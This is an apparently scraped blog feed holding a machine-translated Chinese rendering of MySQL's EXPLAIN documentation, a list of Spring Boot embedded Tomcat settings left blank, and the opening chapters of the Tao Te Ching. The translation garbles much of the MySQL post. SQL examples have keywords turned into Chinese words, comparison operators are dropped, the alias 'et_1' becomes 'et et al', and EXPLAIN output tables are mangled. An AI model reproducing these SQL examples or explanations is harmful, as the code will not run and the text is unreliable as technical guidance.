附加信息。没有与该Extra列对应的单个JSON属性 ; 但是，此列中可能出现的值将作为JSON属性或属性的文本公开message。EXPLAIN加入类型该type列 EXPLAIN输出介绍如何联接表。在JSON格式的输出中，这些被作为access_type属性的值查找。以下列表描述了从最佳类型到最差类型的连接类型：system该表只有一行（=系统表）。这是const连接类型的特例 。const该表至多有一个匹配行，在查询开始时读取。因为只有一行，所以该行中列的值可以被优化器的其余部分视为常量。 const表格非常快，因为它们只能读取一次。const用于将a PRIMARY KEY或 UNIQUE索引的所有部分与常量值进行比较时使用。在以下查询中，tbl_name可以用作const 表格：SELECT * FROM tbl_nameWHERE primary_key= 1;SELECT * FROM tbl_name WHERE primary_key_part1= 1 AND primary_key_part2= 2;eq_ref从这张表中读取一行，用于前面表格的每行组合。除了 system和 const类型之外，这是最好的连接类型。它在索引的所有部分被连接使用并且索引是a PRIMARY KEY或UNIQUE NOT NULL索引时使用。eq_ref可以用于使用=运算符进行比较的索引列 。比较值可以是一个常数，或者是一个表达式，该表达式使用在此表之前读取的表中的列。在以下示例中，MySQL可以使用 eq_ref连接来处理 ref_table：选择*从ref_table，在other_table 哪里ref_table。key_column= other_table。column;选择*从ref_table，在other_table 哪里ref_table。key_column_part1= other_table。column 和ref_table。key_column_part2= 1;ref从该表中读取具有匹配索引值的所有行，用于来自先前表的各行的组合。ref如果连接仅使用键的最左侧前缀或者键不是a PRIMARY KEY或 UNIQUE索引（换句话说，如果连接无法基于键值选择单个行），则使用该键。如果使用的键只匹配几行，这是一个很好的连接类型。ref可以用于使用=or &lt;=&gt; 运算符进行比较的索引列 。在以下示例中，MySQL可以使用 ref连接来处理 ref_table：SELECT * FROM ref_tableWHERE key_column= expr;选择*从ref_table，在other_table 哪里ref_table。key_column= other_table。column;选择*从ref_table，在other_table 哪里ref_table。key_column_part1= other_table。column 和ref_table。key_column_part2= 1;fulltext连接使用FULLTEXT 索引执行。ref_or_null这种连接类型很像 ref，但是另外MySQL会额外搜索包含NULL值的行。这种连接类型优化常用于解析子查询。在以下示例中，MySQL可以使用 ref_or_null连接来处理ref_table：SELECT * FROM ref_table WHERE key_column= exprOR key_column是NULL;请参见第8.2.1.12节“IS NULL优化”。index_merge此连接类型表示使用索引合并优化。在这种情况下，key输出行中的列包含使用的索引列表，并key_len包含所用索引 的最长关键部分列表。有关更多信息，请参见 第8.2.1.3节“索引合并优化”。unique_subquery这种类型取代 了以下形式的eq_ref一些 IN子查询：valueIN（primary_key从single_table哪里选择some_expr）unique_subquery 只是一个索引查找函数，它可以完全替代子查询以提高效率。index_subquery这种连接类型与 unique_subquery。它取代了IN子查询，但它适用于以下形式的子查询中的非唯一索引：valueIN（key_column从single_table哪里选择some_expr）range只有在给定范围内的行才会被检索，使用索引来选择行。的key 输出行中的列指示使用哪个索引。将key_len包含已使用的时间最长的关键部分。该ref列 NULL适用于此类型。range当一个键列使用任何的相比于恒定可使用 =， &lt;&gt;， &gt;， &gt;=， &lt;， &lt;=， IS NULL， &lt;=&gt;， BETWEEN，或 IN()运营商：SELECT * FROM tbl_name WHERE key_column= 10;SELECT * FROM tbl_name WHERE key_column10和20之间;SELECT * FROM tbl_name WHERE key_columnIN（10,20,30）;SELECT * FROM tbl_name WHERE key_part1= 10 AND key_part2IN（10,20,30）;index该index联接类型是一样的 ALL，只是索引树被扫描。这发生在两个方面：如果索引是查询的覆盖索引，并且可用于满足表中所需的所有数据，则只扫描索引树。在这种情况下，该Extra专栏说 Using index。仅索引扫描通常比ALL由于索引大小通常小于表数据而更快 。使用索引中的读取来执行全表扫描，以按索引顺序查找数据行。 Uses index没有出现在 Extra列中。当查询仅使用属于单个索引一部分的列时，MySQL可以使用此连接类型。ALL全表扫描是针对先前表中的每一行组合完成的。如果表格是没有标记的第一个表格const，通常情况下并不好 ，而在其他所有情况下通常 都很糟糕。通常情况下，您可以ALL通过添加索引来避免 这些索引，这些索引可以基于来自较早表的常量值或列值从表中检索行。解释额外信息该Extra列 EXPLAIN输出包含MySQL解决查询的额外信息。以下列表解释了可以在此列中显示的值。每个项目还指示JSON格式的输出，该属性显示该Extra值。对于其中的一些，有一个特定的属性。其他显示为message 属性的文本。如果您希望尽可能快地查询查询，请查找和的Extra值列，或者在JSON格式的输出中查找for 和 等于的属性 。 Using filesortUsing temporaryEXPLAINusing_filesortusing_temporary_tabletrueChild of &apos;table&apos; pushed join@1（JSON：message 文本）该表被引用为table可以下推到NDB内核的连接中的子 节点。仅在启用了下推连接时才适用于NDB群集。有关ndb_join_pushdown更多信息和示例，请参阅 服务器系统变量的说明。const row not found（JSON属性： const_row_not_found）对于诸如此类的查询，该表是空的。 SELECT ... FROM tbl_nameDeleting all rows（JSON属性： message）因为DELETE，一些存储引擎（例如MyISAM）支持一种处理器方法，以简单快捷的方式删除所有表格行。Extra如果引擎使用此优化，则会显示此值。Distinct（JSON属性： distinct）MySQL正在寻找不同的值，所以当它找到第一个匹配的行后，它会停止为当前行组合搜索更多的行。FirstMatch(tbl_name) （JSON属性：first_match）半连接FirstMatch加入快捷方式策略用于tbl_name。Full scan on NULL key（JSON属性： message）当优化程序不能使用索引查找访问方法时，会发生子查询优化作为回退策略。Impossible HAVING（JSON属性： message）该HAVING子句始终为false，不能选择任何行。Impossible WHERE（JSON属性： message）该WHERE子句始终为false，不能选择任何行。Impossible WHERE noticed after reading const tables（JSON属性： message）MySQL已经读取了所有 const（和 system）表，并注意到该WHERE子句总是错误的。LooseScan(m..n) （JSON属性：message）使用半连接LooseScan策略。 m并且 n是关键部件号码。No matching min/max row（JSON属性： message）没有行满足查询条件，如 。 SELECT MIN(...) FROM ... WHERE conditionno matching row in const table（JSON属性：message）对于具有联接的查询，存在空表或没有行满足唯一索引条件的表。No matching rows after partition pruning（JSON属性： message）对于DELETEor UPDATE，优化器在分区修剪后没有发现任何要删除或更新的内容。这是在意义上类似Impossible WHERE 的SELECT声明。No tables used（JSON属性： message）该查询没有FROM子句，或者有一个 FROM DUAL子句。对于INSERT或 REPLACE语句， EXPLAIN当没有SELECT 部分时显示此值。例如，它似乎是EXPLAIN INSERT INTO t VALUES(10)因为这相当于 EXPLAIN INSERT INTO t SELECT 10 FROM DUAL。Not exists（JSON属性： message）MySQL能够对LEFT JOIN 查询进行优化，并且在查找到符合LEFT JOIN条件的一行后，不会在该表中检查前一行组合的更多行。以下是可以用这种方式进行优化的查询类型的示例：SELECT * FROM t1 LEFT JOIN t2 ON t1.id = t2.id WHERE t2.id IS NULL;假定t2.id被定义为 NOT NULL。在这种情况下，MySQL 使用值来 扫描 t1并查找行 。如果MySQL找到匹配的行 ，它就知道 永远不会 ，并且不会扫描具有相同值的其余行。换句话说，对于每一行，MySQL都只需要进行一次查询，而不管有多少行匹配。 t2t1.idt2t2.idNULLt2idt1t2t2Plan isn&apos;t ready yet （JSON属性：无）该值EXPLAIN FOR CONNECTION在优化器没有完成为在命名连接中执行的语句创建执行计划时发生。如果执行计划输出包含多行，那么Extra根据优化程序在确定完整执行计划时的进度，它们中的任何一个或全部都可以具有此 值。Range checked for each record (index map: N)（JSON属性： message）MySQL发现没有好的索引来使用，但发现一些索引可能在前面表格的列值已知之后使用。对于上表中的每一行组合，MySQL检查是否可以使用range或 index_merge访问方法来检索行。这不是非常快，但比完成没有索引的连接要快。适用性标准如 第8.2.1.2节“范围优化”和 第8.2.1.3节“索引合并优化”中所述。，除了前面表格的所有列值是已知的并被认为是常量。索引从1开始编号，顺序SHOW INDEX与表中所示的顺序相同。索引映射值 N是指示哪些索引是候选的位掩码值。例如，0x19（二进制11001）的值意味着将考虑索引1,4和5。Scanned N databases（JSON属性： message）这表示在处理INFORMATION_SCHEMA表查询时服务器执行的目录扫描次数 ，如第8.2.3节“优化INFORMATION_SCHEMA查询”所述。值N可以是0,1或 all。Select tables optimized away（JSON属性：message）优化器确定1）至多应该返回一行，并且2）为了产生该行，必须读取确定性的一组行。当在优化阶段读取的行可以被读取（例如通过读取索引行）时，在查询执行期间不需要读取任何表。当查询被隐式分组（包含聚合函数但没有GROUP BY子句）时，满足第一个条件 。当使用每个索引执行一个行查找时，满足第二个条件。读取的索引数量决定了要读取的行数。考虑以下隐式分组查询：SELECT MIN（c1），MIN（c2）FROM t1;假设MIN(c1)可以通过读取一个索引行MIN(c2) 来检索，并且可以通过从不同索引读取一行来检索。即，对于每一列c1和 c2，存在其中列是索引的第一列的索引。在这种情况下，返回一行，通过读取两个确定性行产生。Extra如果要读取的行不是确定性的，则不会发生 此值。考虑这个查询：SELECT MIN（c2）FROM t1 WHERE c1 &lt;= 10;假设这(c1, c2)是一个覆盖索引。使用此索引，c1 &lt;= 10必须扫描所有行以查找最小值 c2。相比之下，考虑这个查询：SELECT MIN（c2）FROM t1 WHERE c1 = 10;在这种情况下，第一个索引行c1 = 10包含最小值c2 。只有一行必须被读取以产生返回的行。对于每个表保持精确行数的存储引擎（例如MyISAM但不是 InnoDB），对于子句缺失或始终为真且没有 子句的查询，Extra 可能会发生此值。（这是隐式分组查询的一个实例，其中存储引擎影响是否可读取确定数量的行。） COUNT(*)WHEREGROUP BYSkip_open_table， Open_frm_only， Open_full_table（JSON属性： message）这些值表示适用于查询INFORMATION_SCHEMA 表的文件打开优化，如 第8.2.3节“优化INFORMATION_SCHEMA查询”中所述。Skip_open_table：表格文件不需要打开。通过扫描数据库目录，查询中的信息已经可用。Open_frm_only：只.frm需要打开表格 文件。Open_full_table：未优化的信息查询。的.frm， .MYD和 .MYI文件必须被打开。Start temporary，End temporary（JSON属性： message）这表示半连接Duplicate Weedout策略的临时表使用情况。unique row not found（JSON属性： message）对于像这样的查询，没有行满足 索引条件或表上的条件。 SELECT ... FROM tbl_nameUNIQUEPRIMARY KEYUsing filesort（JSON属性： using_filesort）MySQL必须执行额外的传递以了解如何按排序顺序检索行。排序是按照连接类型遍历所有行并存储排序键和指向与该WHERE子句匹配的所有行的行的指针。然后对键进行排序，并按排序顺序检索行。请参见 第8.2.1.13节“按优化排序”。Using index（JSON属性： using_index）只使用索引树中的信息从表中检索列信息，而不必执行额外的查找来读取实际行。当查询仅使用属于单个索引一部分的列时，可以使用此策略。对于InnoDB具有用户定义的聚簇索引的表格，即使列中Using index不存在， 也可以使用该索引Extra。如果type是 index和 key是，就是这种情况 PRIMARY。Using index condition（JSON属性： using_index_condition）通过访问索引元组来读取表，并首先测试它们以确定是否读取全表行。这样，除非必要，否则索引信息用于推迟（“下压 ”）读取全表行。请参见 第8.2.1.5节“索引条件下推优化”。Using index for group-by（JSON属性：using_index_for_group_by）与Using index表访问方法类似，Using index for group-by 表明MySQL找到了一个索引，可用于检索某个GROUP BY或 某个DISTINCT查询的所有列，而无需对实际表进行任何额外的磁盘访问。此外，索引以最有效的方式使用，因此对于每个组，只有少数索引条目被读取。有关详细信息，请参见 第8.2.1.14节“GROUP BY优化”。Using join buffer (Block Nested Loop)， Using join buffer (Batched Key Access) （JSON属性：using_join_buffer）先前连接的表被分成几部分读入连接缓冲区，然后从缓冲区中使用它们的行来执行与当前表的连接。 (Block Nested Loop)指示使用块嵌套循环算法并(Batched Key Access)指示使用批处理密钥访问算法。也就是说，EXPLAIN输出的前一行表格中的键 将被缓冲，并且匹配的行将从Using join buffer出现的行表示的表中批量取出 。在JSON格式的输出中，值 using_join_buffer始终是Block Nested Loop或之一 Batched Key Access。Using MRR（JSON属性： message）使用多范围读取优化策略读取表格。请参见第8.2.1.10节“多量程读取优化”。Using sort_union(...)，Using union(...)，Using intersect(...)（JSON属性： message）这些表明特定的算法显示了如何合并index_merge连接类型的索引扫描 。请参见第8.2.1.3节“索引合并优化”。Using temporary（JSON属性： using_temporary_table）为了解决这个查询，MySQL需要创建一个临时表来保存结果。这通常发生在查询包含GROUP BY和 ORDER BY列出不同列的子句的情况下。Using where（JSON属性： attached_condition）甲WHERE子句用于限制匹配哪些行针对下一个表或发送到客户端。除非特意打算从表中读取或检查所有行，否则如果Extra值不是 Using where且表连接类型为ALL或 ，则 查询中可能有问题index。Using where在JSON格式的输出中没有直接的对应; 该 attached_condition属性包含使用的任何WHERE条件。Using where with pushed condition（JSON属性：message）此产品适用于NDB 表只。这意味着NDB集群正在使用条件下推优化来提高非索引列和常量之间的直接比较效率。在这种情况下，条件被“ 推下 ”到集群的数据节点，并在所有数据节点上同时进行评估。这消除了通过网络发送不匹配的行的需要，并且可以在情况下推可能但未被使用的情况下将这些查询加速5到10倍。有关更多信息，请参阅 第8.2.1.4节“发动机状态下推优化”。Zero limit（JSON属性： message）查询有一个LIMIT 0子句，不能选择任何行。EXPLAIN输出解释通过获取输出rows 列中的值的乘积，可以很好地指示连接有多好EXPLAIN。这应该大致告诉你MySQL必须检查多少行来执行查询。如果使用max_join_size系统变量限制查询，则 该行产品还用于确定SELECT 要执行哪个多表语句以及要中止哪个多表语句。请参见 第5.1.1节“配置服务器”。以下示例显示了如何根据提供的信息逐步优化多表连接 EXPLAIN。假设您有SELECT这里显示的 语句，并且您打算使用EXPLAIN以下语句进行检查 ：EXPLAIN SELECT tt.TicketNumber，tt.TimeIn， tt.ProjectReference，tt.EstimatedShipDate， tt.ActualShipDate，tt.ClientID， tt.ServiceCodes，tt.RepetitiveID， tt.CurrentProcess，tt.CurrentDPerson， tt.RecordVolume，tt.DPPrinted，et.COUNTRY， et_1.COUNTRY，do.CUSTNAME FROM tt，et，et et al，do WHERE tt.SubmitTime是NULL AND tt.ActualPC = et.EMPLOYID AND tt.AssignedPC = et_1.EMPLOYID AND tt.ClientID = do.CUSTNMBR;对于这个例子，做出以下假设：被比较的列已被声明如下。表 柱 数据类型tt ActualPC CHAR(10)tt AssignedPC CHAR(10)tt ClientID CHAR(10)et EMPLOYID CHAR(15)do CUSTNMBR CHAR(15)这些表具有以下索引。表 指数tt ActualPCtt AssignedPCtt ClientIDet EMPLOYID （首要的关键）do CUSTNMBR （首要的关键）该tt.ActualPC值不是均匀分布的。最初，在执行任何优化之前，该 EXPLAIN语句会生成以下信息：表类型possible_keys键key_len参考行额外et ALL PRIMARY NULL NULL NULL 74做所有主要的空NULL NULL 2135et_1 ALL PRIMARY NULL NULL NULL 74t ALL ALL AssignedPC，NULL NULL NULL 3872 客户端ID， ActualPC的 范围为每条记录检查（索引映射：0x23）因为type是 ALL为每个表，这个输出表明MySQL正在生成的所有表的笛卡儿积; 也就是每行的组合。这需要相当长的时间，因为必须检查每个表中行数的乘积。对于手头的情况，该产品为74×2135×74×3872 = 45,268,558,720行。如果桌子更大，你只能想象需要多长时间。这里的一个问题是，如果MySQL声明为相同的类型和大小，MySQL可以更有效地在列上使用索引。在这种情况下，VARCHAR与 CHAR被认为是相同的，如果它们被声明为相同的大小。 tt.ActualPC被声明为 CHAR(10)和et.EMPLOYID 是CHAR(15)，所以有一个长度不匹配。以固定柱长度上的不同，使用 ALTER TABLE加长 ActualPC从10个字符到15个字符：MySQL的&gt; ALTER TABLE tt MODIFY ActualPC VARCHAR(15);现在tt.ActualPC， et.EMPLOYID都是 VARCHAR(15)。EXPLAIN再次执行该 语句会产生以下结果：表类型possible_keys键key_len参考行额外tt ALL AssignedPC，NULL NULL NULL 3872使用 ClientID，其中 ActualPC的做所有主要的空NULL NULL 2135 每个记录检查范围（索引图：0x1）et_1 ALL PRIMARY NULL NULL NULL 74 每个记录检查范围（索引图：0x1）et eq_ref主要小计15 tt.ActualPC 1这并不完美，但要好得多：rows值的乘积 减少了74倍。该版本在几秒钟内执行。可以进行第二次更改以消除tt.AssignedPC = et_1.EMPLOYID和tt.ClientID = do.CUSTNMBR比较的列长度不匹配：MySQL的&gt; ALTER TABLE tt MODIFY AssignedPC VARCHAR(15), MODIFY ClientID VARCHAR(15);修改完成后， EXPLAIN生成如下所示的输出：表类型possible_keys键key_len参考行额外et ALL PRIMARY NULL NULL NULL 74tt ref AssignedPC，ActualPC 15 et.EMPLOYID 52使用 ClientID，其中 ActualPC的et_1 eq_ref初级小学15 tt.AssignedPC 1do eq_ref PRIMARY PRIMARY 15 tt.ClientID 1在这一点上，查询几乎尽可能地被优化。剩下的问题是，默认情况下，MySQL假定tt.ActualPC 列中的值是均匀分布的，而tt表不是这种情况。幸运的是，很容易告诉MySQL分析密钥分发：MySQL的&gt; ANALYZE TABLE tt;通过额外的索引信息，连接是完美的，并 EXPLAIN产生这样的结果：表类型possible_keys键key_len参考行额外tt ALL AssignedPC NULL NULL NULL 3872使用 ClientID，其中 ActualPC的et eq_ref主要小计15 tt.ActualPC 1et_1 eq_ref初级小学15 tt.AssignedPC 1do eq_ref PRIMARY PRIMARY 15 tt.ClientID 1rows输出中 的列 EXPLAIN是来自MySQL连接优化器的有根据的猜测。通过将rows产品与查询返回的实际行数进行比较，检查数字是否接近真相 。如果数字非常不同，则可以通过STRAIGHT_JOIN在 SELECT语句中使用并尝试在FROM子句中以不同顺序列出表，来 获得更好的性能 。（但是， STRAIGHT_JOIN可能会阻止索引被使用，因为它会禁用半连接转换。请参见第8.2.2.1节“使用半连接转换 优化子查询，派生表和视图引用”。）在某些情况下，可能会执行EXPLAIN SELECT与子查询一起使用时修改数据的语句; 有关更多信息，请参见第13.2.10.8节“派生表”。 8.8.3扩展的EXPLAIN输出格式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138对于SELECT语句，该 EXPLAIN语句会生成额外的（“ 扩展 ”）信息，这些信息不是EXPLAIN输出的一部分， 但可以通过在SHOW WARNINGS 后面发布语句来查看EXPLAIN。输出中的 Message值SHOW WARNINGS显示优化程序如何限定SELECT语句 中的表名和列名 SELECT，重写和优化规则的应用程序后的外观，以及可能有关优化过程的其他说明。可以通过SHOW WARNINGS以下语句 显示的扩展信息 EXPLAIN仅用于 SELECT语句。 SHOW WARNINGS显示其他可解释语句（一个空的结果DELETE， INSERT， REPLACE，和 UPDATE）。注意在较旧的MySQL版本中，使用扩展信息EXPLAIN EXTENDED。该语法仍被认为是向后兼容的，但扩展输出现在默认启用，所以EXTENDED关键字是多余的并且被弃用。它的使用会导致警告，并且它将EXPLAIN 在未来的MySQL版本中从语法中删除。这是一个扩展EXPLAIN输出的例子 ：MySQL的&gt; EXPLAIN SELECT t1.a, t1.a IN (SELECT t2.a FROM t2) FROM t1\G*************************** 1. row ******************** ******* ID：1 select_type：PRIMARY 表：t1 键入：indexpossible_keys：NULL 键：主键 key_len：4 ref：NULL 行数：4 过滤：100.00 额外：使用索引*************************** 2. row ******************** ******* ID：2 select_type：SUBQUERY 表格：t2 键入：indexpossible_keys：a 关键：a key_len：5 ref：NULL 行数：3 过滤：100.00 额外：使用索引设置2行，1警告（0.00秒）MySQL的&gt; SHOW WARNINGS\G*************************** 1. row ******************** ******* 级别：注意 代码：1003消息：/ * select＃1 * / select`test`.`t1`.`a` as`a`， &lt;in_optimizer&gt;（`test`.`t1`.`a``，`test`.``t1`.`a` in （&lt;materialize&gt;（/ *选择＃2 * /选择`test`.`t2`.`a` from`test`.`t2` where 1 has 1）， &lt;primary_index_lookup&gt;（`test`.```t1`.`a` in &lt;auto_key&gt;上的&lt;临时表&gt; where（（&apos;test`.`t1`.`a` =`materialized-subquery`.`a`）））））AS`t1.a IN（SELECT t2.a FROM t2）`from`test`.`t1`一排（0.00秒）由于显示的语句SHOW WARNINGS可能包含特殊标记以提供有关查询重写或优化程序操作的信息，因此该语句不一定是有效的SQL，并且不打算执行。输出还可能包含具有Message值的行， 以提供有关优化程序执行的操作的附加非SQL说明性注释。以下列表描述了可以显示在扩展输出中的特殊标记SHOW WARNINGS：&lt;auto_key&gt;一个临时表的自动生成的密钥。&lt;cache&gt;(expr)表达式（例如标量子查询）会执行一次，并将结果值保存在内存中供以后使用。对于由多个值组成的结果，可能会创建一个临时表，您将看到&lt;temporary table&gt;。&lt;exists&gt;(query fragment)子查询谓词转换为 EXISTS谓词，并且子查询被转换，以便它可以与EXISTS谓词一起使用 。&lt;in_optimizer&gt;(query fragment)这是一个没有用户意义的内部优化器对象。&lt;index_lookup&gt;(query fragment)使用索引查找处理查询片段以查找合格的行。&lt;if&gt;(condition, expr1, expr2)如果条件成立，则评估为 expr1否则 expr2。&lt;is_not_null_test&gt;(expr)验证表达式不评估的测试 NULL。&lt;materialize&gt;(query fragment)使用子查询实现。`materialized-subquery`.col_name对col_name内部临时表中的列的引用，具体化为 保留评估子查询的结果。&lt;primary_index_lookup&gt;(query fragment)使用主键查找处理查询片段以查找合格的行。&lt;ref_null_helper&gt;(expr)这是一个没有用户意义的内部优化器对象。/* select#N */ select_stmt该SELECT行与非扩展EXPLAIN输出中具有id值的 行相关联N。outer_tables semi join (inner_tables)半连接操作。 inner_tables显示没有拔出的表格。请参见第8.2.2.1节“使用半连接转换优化子查询，派生表和视图引用”。&lt;temporary table&gt;这表示为创建缓存中间结果而创建的内部临时表。当某些表是const 或system类型时，涉及这些表中的列的表达式由优化器提前评估，而不是显示的语句的一部分。但是，FORMAT=JSON有些 const表访问显示为ref使用const值的访问。 8.8.4获取命名连接的执行计划信息 1234567891011121314151617181920212223242526272829303132333435363738要获取在命名连接中执行的可解释语句的执行计划，请使用以下语句：EXPLAIN [ options]连接connection_id;EXPLAIN FOR CONNECTION返回EXPLAIN当前用于在给定连接中执行查询的信息。由于数据（和支持统计）的更改，它可能会产生与运行EXPLAIN等效查询文本不同的结果 。这种行为差异可用于诊断更多暂时性能问题。例如，如果您在一个需要很长时间才能完成的会话中运行语句，请使用EXPLAIN FOR CONNECTION在另一个会话中使用可能会产生有关延迟原因的有用信息。connection_id是从INFORMATION_SCHEMA PROCESSLIST表或者 SHOW PROCESSLIST语句中获得的连接标识符 。如果您有PROCESS权限，则可以为任何连接指定标识符。否则，您只能为自己的连接指定标识符。如果指定的连接未执行语句，则结果为空。否则，EXPLAIN FOR CONNECTION 仅适用于在指定连接中执行的语句是可解释的情况。这包括 SELECT， DELETE， INSERT， REPLACE，和 UPDATE。（但是， EXPLAIN FOR CONNECTION对于准备好的语句，即使是这些类型的准备语句也不起作用。）如果指定的连接正在执行可解释的语句，则输出是您将使用的内容 EXPLAIN在语句本身上内容。如果指定的连接正在执行不可解释的语句，则会发生错误。例如，您不能为当前会话命名连接标识符，因为 EXPLAIN无法解释：MySQL的&gt; SELECT CONNECTION_ID();+ ----------------- +| CONNECTION_ID（）|+ ----------------- +| 373 |+ ----------------- +一排（0.00秒）MySQL的&gt; EXPLAIN FOR CONNECTION 373;错误1889（HY000）：EXPLAIN FOR CONNECTION命令受支持仅适用于SELECT / UPDATE / INSERT / DELETE / REPLACE该Com_explain_other状态变量表示的数 EXPLAIN FOR CONNECTION执行的语句。 8.8.5估计查询性能 123456789101112131415161718192021在大多数情况下，您可以通过计算磁盘查找来估计查询性能。对于小型表格，通常可以在一次磁盘查找中找到一行（因为索引可能已被缓存）。对于更大的表格，您可以使用B-tree索引来估计，您需要这么多的查找来查找一行： log(row_count) / log(index_block_length / 3 * 2 / (index_length + data_pointer_length)) + 1。在MySQL中，索引块通常是1024个字节，数据指针通常是4个字节。对于密钥值长度为三个字节（大小MEDIUMINT）的500,000行表 ，公式指示 log(500,000)/log(1024/3*2/(3+4)) + 1= 4查找。这个索引需要大约500,000 * 7 * 3/2 = 5.2MB的存储空间（假设一个典型的索引缓冲区填充率为2/3），所以你可能在内存中有很多索引，所以只需要一两个调用读取数据以查找该行。然而，对于写操作，需要四个查找请求来查找放置新索引值的位置，通常需要两次查找来更新索引并写入行。上述讨论并不意味着您的应用程序性能会通过日志缓慢退化 N。只要所有东西都被操作系统或MySQL服务器缓存，随着表变大，事情变得稍微慢一些。数据变得太大而无法缓存后，事情开始变得缓慢，直到您的应用程序仅受磁盘查找（日志增加N）的约束 。为避免这种情况，请在数据增长时增加密钥缓存大小。对于MyISAM 表，键缓存大小由key_buffer_size系统变量控制 。请参见第5.1.1节“配置服务器”。]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[springboot 配置 内嵌 tomcat]]></title>
    <url>%2F2018%2F02%2F24%2Fspring-boot%2Fspringboot-tomcat%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637383940#启动端口server. Port = xxxx#绑定ipserver. Address =#容器 uriserver. contextPath =#部署nameserver. displayName =#servlet 路径server. servletPath =#容器参数server. contextParameters =#转发headerserver. useForwardHeaders =#服务headerserver. serverHeader =#最大 header大小server. maxHttpHeaderSize =#最大 post 数据大小server. maxHttpPostSize =#连接超时时间server. connectionTimeout =#session 失效时间server. session.timeout =#模块跟踪server. session.trackingModes =server. session.persistent =#数据缓存目录【常见上传图片】server.session.storeDir =#cookie 名字 server.cookie. name =#域服务名字server.cookie. domain =#cookie 路径server.cookie. path =#cookie 备注server.cookie. comment = {———-} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899server.cookie. httpOnly =server.cookie. secure =server.cookie. maxAge =server. ssl. Enabled =server.ssl. clientAuth =server.ssl. ciphers =server.ssl. enabledProtocols =server.ssl. keyAlias =server.ssl. keyPassword =server.ssl. keyStore =server.ssl. keyStorePassword =server.ssl. keyStoreType =server.ssl. keyStoreProvider =server.ssl. trustStore =server.ssl. trustStorePassword =server.ssl. trustStoreType =server.ssl. trustStoreProvider =server.ssl. protocol =server.compression. enabled =server.compression.mimeTypes =server.compression.excludedUserAgents =server.compression.minResponseSize =server. jspServlet. className =server.jspServlet. initParameters =server.jspServlet.registered =server.tomcat.accesslog.enabled =server.tomcat.accesslog.pattern =server.tomcat.accesslog.directory =server.tomcat.accesslog.prefix =server.tomcat.accesslog.suffix =server.tomcat.accesslog.rotate =server.tomcat.accesslog.renameOnRotate =server.tomcat.accesslog.requestAttributesEnabled=server.tomcat.accesslog.buffered =server.tomcat.internalProxies =server.tomcat.protocolHeader =server.tomcat.protocolHeaderHttpsValue =server.tomcat.portHeader =server.tomcat.remoteIpHeader=server.tomcat.basedir =server.tomcat.backgroundProcessorDelay =server.tomcat.maxThreads =server.tomcat.minSpareThreads =server.tomcat.maxHttpPostSize =server.tomcat.maxHttpHeaderSize =server.tomcat.redirectContextRoot =server.tomcat.uriEncoding =server.tomcat.maxConnections =server.tomcat.acceptCount =server.tomcat.additionalTldSkipPatterns =]]></content>
      <categories>
        <category>java</category>
        <category>spring-boot</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[道德经 全文]]></title>
    <url>%2F2017%2F11%2F20%2Fessay%2Fdaodejing%2F</url>
    <content type="text"><![CDATA[《道德经》全文 01.道可道，非常道。名可名，非常名。无名天地之始。有名万物之母。故常无欲以观其妙。常有欲以观其徼。此两者同出而异名，同谓之玄。玄之又玄，众妙之门。 02.天下皆知美之为美，斯恶矣；皆知善之为善，斯不善已。故有无相生，难易相成，长短相形，高下相倾，音声相和，前後相随。是以圣人处无为之事，行不言之教。万物作焉而不辞。生而不有，为而不恃，功成而弗居。夫唯弗居，是以不去。 03.不尚贤， 使民不争。不贵难得之货，使民不为盗。不见可欲，使民心不乱。是以圣人之治，虚其心，实其腹，弱其志，强其骨；常使民无知、无欲，使夫智者不敢为也。为无为，则无不治。 04.道冲而用之，或不盈。渊兮似万物之宗。解其纷，和其光，同其尘，湛兮似或存。吾不知谁之子，象帝之先。 05.天地不仁，以万物为刍狗。圣人不仁，以百姓为刍狗。天地之间，其犹橐迭乎？虚而不屈，动而愈出。多言数穷，不如守中。 06.谷神不死是谓玄牝。玄牝之门是谓天地根。绵绵若存，用之不勤。 07.天长地久。天地所以能长且久者，以其不自生，故能长生。是以圣人後其身而身先，外其身而身存。非以其无私邪！故能成其私。 08.上善若水。水善利万物而不争，处众人之所恶，故几於道。居善地，心善渊，与善仁，言善信，正善治，事善能，动善时。夫唯不争，故无尤。 09.持而盈之不如其己；揣而锐之不可长保；金玉满堂莫之能守；富贵而骄，自遗其咎。功遂身退，天之道。 10.载营魄抱一，能无离乎？专气致柔，能如婴儿乎？涤除玄览，能无疵乎？爱国治民，能无为乎？天门开阖，能为雌乎？明白四达，能无知乎。 11.三十幅共一毂，当其无，有车之用。埏埴以为器，当其无，有器之用。凿户牖以为室，当其无，有室之用。故有之以为利，无之以为用。 12.五色令人目盲，五音令人耳聋，五味令人口爽，驰骋畋猎令人心发狂，难得之货令人行妨。是以圣人，为腹不为目，故去彼取此。 13.宠辱若惊，贵大患若身。何谓宠辱若惊？宠为下。得之若惊失之若惊是谓宠辱若惊。何谓贵大患若身？吾所以有大患者，为吾有身，及吾无身，吾有何患。故贵以身为天下，若可寄天下。爱以身为天下，若可托天下。 14.视之不见名曰夷。听之不闻名曰希。抟之不得名曰微。此三者不可致诘，故混而为一。其上不皦(jiǎo)，其下不昧，绳绳不可名，复归於无物。是谓无状之状，无物之象，是谓惚恍。迎之不见其首，随之不见其後。执古之道以御今之有。能知古始，是谓道纪。 15.古之善为士者，微妙玄通，深不可识。夫唯不可识，故强为之容。豫兮若冬涉川；犹兮若畏四邻；俨兮其若容；涣兮若冰之将释；敦兮其若朴；旷兮其若谷；混兮其若浊；澹兮其若海；飉(liáo,风的声音)兮若无止。孰能浊以静之徐清。孰能安以动之徐生。保此道者不欲盈。夫唯不盈故能蔽而新成。 16.致虚极守静笃。万物并作，吾以观复。夫物芸芸各复归其根。归根曰静，是谓复命；复命曰常，知常曰明。不知常，妄作凶。知常容，容乃公，公乃全，全乃天，天乃道，道乃久，没身不殆。 17.太上，下知有之。其次，亲而誉之。其次，畏之。其次，侮之。信不足焉，有不信焉。悠兮其贵言，功成事遂，百姓皆谓∶我自然。 